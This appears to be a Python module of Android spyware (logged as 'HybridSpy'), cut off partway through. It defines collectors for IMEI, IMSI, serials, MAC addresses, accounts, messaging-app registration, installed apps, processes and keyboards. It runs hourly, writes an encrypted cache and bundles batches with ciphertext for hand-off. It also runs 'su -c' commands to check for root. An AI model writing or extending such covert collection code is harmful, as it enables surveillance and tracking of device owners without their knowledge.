#!/usr/bin/env python3
"""
Device Info Collector v2.1.0 — Elite Grade
Comprehensive Android device fingerprinting with maximum data recovery.
Collects hardware, software, network, account, and environment information
through multiple system APIs and data sources.

Data categories collected:
  1. Build properties (ro.* from build.prop & system properties)
  2. Hardware identifiers (IMEI, IMSI, Android ID, serial, MAC, etc.)
  3. Software environment (OS, security patch, bootloader, radio)
  4. Network info (operator, IP, connection type, SIM info)
  5. Account info (Google accounts, device accounts)
  6. Sensors & hardware capabilities
  7. Display & input devices
  8. Battery & power state
  9. Storage & memory
  10. Installed apps & permissions
  11. Security state (root status, SELinux, encryption)
  12. Running processes & services
"""
import json
import logging
import os
import re
import subprocess
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

log = logging.getLogger("HybridSpy.Collectors.DeviceInfo")


# ─── Constants ───────────────────────────────────────────────────────────────

STATE_FILE = "device_info_state.json"
CACHE_FILE = "device_info_cache.enc"
COLLECTION_INTERVAL = 3600  # Every hour

SENSITIVE_PROPS = [
    "ro.build.display.id",
    "ro.build.version.release",
    "ro.build.version.sdk",
    "ro.build.version.security_patch",
    "ro.product.model",
    "ro.product.manufacturer",
    "ro.product.brand",
    "ro.product.device",
    "ro.product.name",
    "ro.serialno",
    "ro.boot.serialno",
    "ro.ril.oem.imei",
    "ro.ril.oem.imei1",
    "ro.ril.oem.imei2",
    "ro.telephony.imei",
    "ro.build.fingerprint",
    "ro.build.description",
    "ro.build.date.utc",
    "ro.build.type",
    "ro.build.tags",
    "ro.boot.baseband",
    "ro.boot.bootloader",
    "ro.boot.hardware",
    "ro.bootloader",
    "ro.hardware",
    "ro.revision",
    "ro.build.user",
    "ro.build.host",
    "ro.debuggable",
    "ro.secure",
    "ro. zygote",
    "ro.crypto.state",
    "ro.crypto.type",
    "ro.sf.lcd_density",
    "ro.opengles.version",
    "ro.board.platform",
    "ro.product.board",
    "ro.product.cpu.abi",
    "ro.product.cpu.abilist",
    "ro.arch",
    "gsm.version.baseband",
    "gsm.version.ril-impl",
    "gsm.operator.alpha",
    "gsm.operator.numeric",
    "gsm.sim.operator.alpha",
    "gsm.sim.operator.numeric",
    "gsm.sim.operator.name",
    "persist.sys.country",
    "persist.sys.language",
    "persist.sys.timezone",
    "net.hostname",
    "dhcp.wlan0.dns1",
    "dhcp.wlan0.dns2",
    "dhcp.wlan0.gateway",
    "dhcp.wlan0.ipaddress",
    "dhcp.wlan0.domain",
    "wifi.interface",
]


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class BuildProperties:
    """Android build properties from getprop and build.prop."""
    all_props: Dict[str, str] = field(default_factory=dict)
    sdk_version: int = 0
    release_version: str = ""
    security_patch: str = ""
    model: str = ""
    manufacturer: str = ""
    brand: str = ""
    device: str = ""
    product: str = ""
    hardware: str = ""
    bootloader: str = ""
    radio_version: str = ""
    fingerprint: str = ""
    is_debuggable: bool = False
    is_secure: bool = True
    display_density: int = 0
    opengl_version: str = ""
    cpu_abi: str = ""
    cpu_abilist: str = ""
    board_platform: str = ""
    build_type: str = ""
    build_tags: str = ""
    build_date_utc: int = 0
    build_user: str = ""
    build_host: str = ""
    serialno: str = ""
    encryption_state: str = ""
    encryption_type: str = ""   


@dataclass
class HardwareIdentifiers:
    """Hardware-level identifiers."""
    android_id: str = ""
    gsf_android_id: str = ""    # Google Services Framework ID
    serial: str = ""
    sim_serial: Optional[str] = None
    imei: List[str] = field(default_factory=list)
    imei_sv: str = ""
    meid: str = ""
    imsi: str = ""
    device_id: str = ""
    mac_address: str = ""
    bluetooth_mac: str = ""
    wifi_mac: str = ""
    wlan_mac: str = ""
    eth_mac: str = ""
    hardware_uuid: str = ""
    board_serial: str = ""
    motherboard_serial: str = ""


@dataclass
class NetworkInfo:
    """Device network environment."""
    connection_type: str = ""        # WiFi, Mobile, Ethernet, etc.
    mobile_network_type: str = ""    # LTE, 5G, 3G, etc.
    is_roaming: bool = False
    is_airplane_mode: bool = False
    data_enabled: bool = False
    wifi_enabled: bool = False
    wifi_ssid: str = ""
    wifi_bssid: str = ""
    wifi_signal_strength: int = 0
    wifi_speed: int = 0
    wifi_frequency: int = 0
    wifi_ip: str = ""
    wifi_gateway: str = ""
    wifi_dns: List[str] = field(default_factory=list)
    mobile_ip: str = ""
    public_ip: str = ""             # External IP via DNS/STUN
    operator: str = ""
    operator_numeric: str = ""
    sim_operator: str = ""
    sim_country: str = ""
    sim_operator_numeric: str = ""
    country_iso: str = ""
    network_country: str = ""
    mcc: int = 0
    mnc: int = 0
    is_vpn_active: bool = False
    proxy_host: str = ""
    proxy_port: int = 0
    dns_servers: List[str] = field(default_factory=list)
    gateway: str = ""
    subnet_mask: str = ""


@dataclass
class AccountInfo:
    """Accounts registered on device."""
    google_accounts: List[str] = field(default_factory=list)
    device_accounts: List[Dict] = field(default_factory=list)
    samsung_account: Optional[str] = None
    whatsapp_registered: bool = False
    telegram_registered: bool = False
    signal_registered: bool = False


@dataclass
class BatteryInfo:
    """Battery and power state."""
    level: int = 0
    is_charging: bool = False
    charge_type: str = ""         # USB, AC, Wireless
    temperature: float = 0.0
    voltage: int = 0
    current_now: int = 0
    capacity: int = 0
    health: str = ""
    technology: str = ""
    power_source: str = ""
    estimated_remaining: int = 0   # minutes


@dataclass
class DisplayInfo:
    """Display characteristics."""
    width: int = 0
    height: int = 0
    density_dpi: int = 0
    density_bucket: str = ""
    refresh_rate: float = 0.0
    screen_brightness: int = 0
    screen_brightness_mode: str = ""
    readable_density: str = ""  # mdpi, hdpi, xhdpi, etc.
    physical_size_inch: float = 0.0
    cutout_type: str = ""
    hdr_capabilities: List[str] = field(default_factory=list)


@dataclass
class SensorInfo:
    """Available hardware sensors."""
    sensors: List[Dict] = field(default_factory=list)
    has_accelerometer: bool = False
    has_gyroscope: bool = False
    has_magnetometer: bool = False
    has_barometer: bool = False
    has_proximity: bool = False
    has_light_sensor: bool = False
    has_fingerprint: bool = False
    has_face_auth: bool = False
    has_iris_scanner: bool = False
    has_nfc: bool = False
    has_ir_blaster: bool = False
    has_fm_radio: bool = False
    has_usb_otg: bool = False
    has_wifi_direct: bool = False
    has_bluetooth_le: bool = False


@dataclass
class MemoryStorage:
    """Memory and storage information."""
    total_ram: int = 0
    available_ram: int = 0
    low_memory: bool = False
    total_internal_storage: int = 0
    available_internal_storage: int = 0
    total_external_storage: int = 0
    available_external_storage: int = 0
    is_sd_card_present: bool = False
    sd_card_path: str = ""
    encrypted_storage: bool = False
    storage_type: str = ""       # eMMC, UFS
    swap_total: int = 0
    swap_used: int = 0


@dataclass
class SecurityState:
    """Device security posture."""
    is_rooted: bool = False
    root_method: str = ""
    is_selinux_enforcing: bool = True
    selinux_context: str = ""
    bootloader_unlocked: bool = False
    verified_boot_state: str = ""
    dm_verity_enabled: bool = False
    has_custom_recovery: bool = False
    encryption_state: str = ""
    encryption_type: str = ""
    mock_location_enabled: bool = False
    usb_debugging_enabled: bool = False
    developer_options_enabled: bool = False
    unknown_sources_enabled: bool = False
    play_protect_enabled: bool = True
    has_device_admin: bool = False
    has_work_profile: bool = False
    is_profile_owner: bool = False
    is_device_owner: bool = False
    accessibility_services: List[str] = field(default_factory=list)
    installed_keyboards: List[str] = field(default_factory=list)


@dataclass
class InstalledApp:
    """A single installed application."""
    package_name: str
    app_name: str = ""
    version_name: str = ""
    version_code: int = 0
    install_time: int = 0
    update_time: int = 0
    is_system: bool = False
    is_enabled: bool = True
    is_persistent: bool = False
    requested_permissions: List[str] = field(default_factory=list)
    granted_permissions: List[str] = field(default_factory=list)
    target_sdk: int = 0
    min_sdk: int = 0
    has_debuggable_flag: bool = False
    has_backup_allowed: bool = True
    data_dir: str = ""
    primary_activity: str = ""
    services: List[str] = field(default_factory=list)
    receivers: List[str] = field(default_factory=list)
    
    @property
    def fingerprint(self) -> str:
        return f"{self.package_name}:{self.version_code}"


@dataclass
class RunningProcess:
    """A running process."""
    pid: int
    name: str
    package_name: str = ""
    user: str = ""
    cpu_usage: float = 0.0
    memory_kb: int = 0
    thread_count: int = 0
    priority: int = 0
    state: str = ""
    started_time: int = 0
    foreground: bool = False


@dataclass
class LocaleInfo:
    """Locale and regional settings."""
    language: str = ""
    country: str = ""
    timezone: str = ""
    date_format: str = ""
    time_format: str = ""
    first_day_of_week: int = 0
    measurement_system: str = ""
    temperature_unit: str = ""
    locale_list: List[str] = field(default_factory=list)


@dataclass
class CompleteDeviceInfo:
    """
    Complete device fingerprint — all data in one structure.
    This is the output of a full collection cycle.
    """
    build: BuildProperties = field(default_factory=BuildProperties)
    hardware: HardwareIdentifiers = field(default_factory=HardwareIdentifiers)
    network: NetworkInfo = field(default_factory=NetworkInfo)
    accounts: AccountInfo = field(default_factory=AccountInfo)
    battery: BatteryInfo = field(default_factory=BatteryInfo)
    display: DisplayInfo = field(default_factory=DisplayInfo)
    sensors: SensorInfo = field(default_factory=SensorInfo)
    memory: MemoryStorage = field(default_factory=MemoryStorage)
    security: SecurityState = field(default_factory=SecurityState)
    installed_apps: List[InstalledApp] = field(default_factory=list)
    running_processes: List[RunningProcess] = field(default_factory=list)
    locale: LocaleInfo = field(default_factory=LocaleInfo)
    
    # Metadata
    collection_timestamp: int = field(default_factory=lambda: int(time.time() * 1000))
    collection_duration_ms: int = 0
    
    @property
    def device_fingerprint_hash(self) -> str:
        """Unique hash to identify this device."""
        import hashlib
        components = [
            self.build.fingerprint,
            self.hardware.android_id,
            self.hardware.serial,
            str(self.hardware.imei),
            self.build.model,
            self.build.manufacturer,
        ]
        return hashlib.sha256("|".join(filter(None, components)).encode()).hexdigest()[:16]


@dataclass 
class DeviceInfoBatch:
    info: CompleteDeviceInfo
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    ciphertext: Optional[bytes] = None


# ─── System Property Reader ──────────────────────────────────────────────────

class SystemPropertyReader:
    """Read Android system properties using getprop and build.prop."""
    
    def __init__(self, native_bridge=None, has_root: bool = False):
        self._native = native_bridge
        self._has_root = has_root
    
    def read_all(self) -> Dict[str, str]:
        """Read all system properties."""
        props = {}
        
        # Method 1: getprop command (most reliable)
        try:
            output = subprocess.check_output(
                ["getprop"], 
                stderr=subprocess.DEVNULL,
                timeout=5
            ).decode("utf-8", errors="replace")
            
            for line in output.split("\n"):
                line = line.strip()
                if ":" in line:
                    # Format: [prop.name]: [value]
                    match = re.match(r'\[([^\]]+)\]:\s*\[([^\]]*)\]', line)
                    if match:
                        props[match.group(1)] = match.group(2)
        except Exception:
            pass
        
        # Method 2: Individual property reads for critical values
        for prop in SENSITIVE_PROPS:
            if prop not in props:
                try:
                    value = subprocess.check_output(
                        ["getprop", prop],
                        stderr=subprocess.DEVNULL,
                        timeout=2
                    ).decode("utf-8", errors="replace").strip()
                    if value:
                        props[prop] = value
                except Exception:
                    pass
        
        # Method 3: Read build.prop directly (root only)
        if self._has_root:
            try:
                with open("/system/build.prop", "r", errors="replace") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            if "=" in line:
                                key, value = line.split("=", 1)
                                key = key.strip()
                                value = value.strip()
                                if key and value and key not in props:
                                    props[key] = value
            except Exception:
                pass
            
            # Also check vendor props
            for vendor_path in ["/vendor/build.prop", "/odm/build.prop"]:
                try:
                    with open(vendor_path, "r", errors="replace") as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith("#") and "=" in line:
                                key, value = line.split("=", 1)
                                key = key.strip()
                                if key and key not in props:
                                    props[key.strip()] = value.strip()
                except Exception:
                    pass
        
        return props
    
    def get_prop(self, name: str, default: str = "") -> str:
        """Get a single property value."""
        try:
            value = subprocess.check_output(
                ["getprop", name],
                stderr=subprocess.DEVNULL,
                timeout=2
            ).decode("utf-8", errors="replace").strip()
            return value if value else default
        except Exception:
            return default


# ─── Root Detection ──────────────────────────────────────────────────────────

class RootDetector:
    """Detect device root status through multiple indicators."""
    
    ROOT_INDICATORS = [
        "/system/app/Superuser.apk",
        "/system/app/SuperSU.apk",
        "/system/app/Magisk.apk",
        "/data/data/me.phh.superuser",
        "/data/data/topjohnwu.magisk",
        "/data/data/com.noshufou.android.su",
        "/data/data/com.thirdparty.superuser",
        "/system/xbin/su",
        "/system/bin/su",
        "/sbin/su",
        "/su/bin/su",
        "/magisk/.magisk",
        "/data/adb/magisk",
        "/data/adb/su",
    ]
    
    ROOT_COMMANDS = [
        "su -c id",
        "su -c 'ls /data'",
    ]
    
    @classmethod
    def check_root(cls) -> Tuple[bool, str]:
        """Check if device is rooted. Returns (is_rooted, method)."""
        # Check for su binary
        for path in cls.ROOT_INDICATORS:
            if os.path.exists(path):
                return True, f"binary:{path}"
        
        # Check for root manager apps
        root_apps = [
            "topjohnwu.magisk", "com.noshufou.android.su",
            "com.thirdparty.superuser", "me.phh.superuser",
            "eu.chainfire.supersu",
        ]
        
        # Try running su commands
        for cmd in cls.ROOT_COMMANDS:
            try:
                result = subprocess.run(
                    cmd.split(), 
                    capture_output=True, 
                    timeout=5,
                    env={}
                )
                if result.returncode == 0 and b"uid=0" in result.stdout:
                    return True, "su_command"
            except Exception:
                continue
        
        # Check build tags
        try:
            tags = subprocess.check_output(
                ["getprop", "ro.build.tags"],
                timeout=2
            ).decode().strip()
            if "test-keys" in tags:
                return True, "test_keys"
        except Exception:
            pass
        
        return False, ""


# ─── Device Info Collector ───────────────────────────────────────────────────

class DeviceInfoCollector:
    """
    Elite-grade device information collector.
    Gathers comprehensive device fingerprint and environment data
    through multiple collection vectors.
    
    Data sources:
      - System properties (getprop, build.prop)
      - Java Android API via JNI bridge
      - Shell commands
      - Proc filesystem
      - Network interfaces
      - Installed package manager
      - Account manager
      - Battery manager
      - Sensor manager
      - Display manager
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[DeviceInfoBatch], None]] = None,
                 config: Optional[Dict] = None,
                 native_bridge=None):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._config = config or {}
        self._native = native_bridge
        
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        # Last collected data for change detection
        self._last_info: Optional[CompleteDeviceInfo] = None
        self._device_fingerprint: Optional[str] = None
        
        # Batch tracking
        self._batch_interval = COLLECTION_INTERVAL
        self._last_collection = 0
        
        # Stats
        self._stats = {
            "collections": 0,
            "batches": 0,
            "errors": 0,
            "last_collection": None,
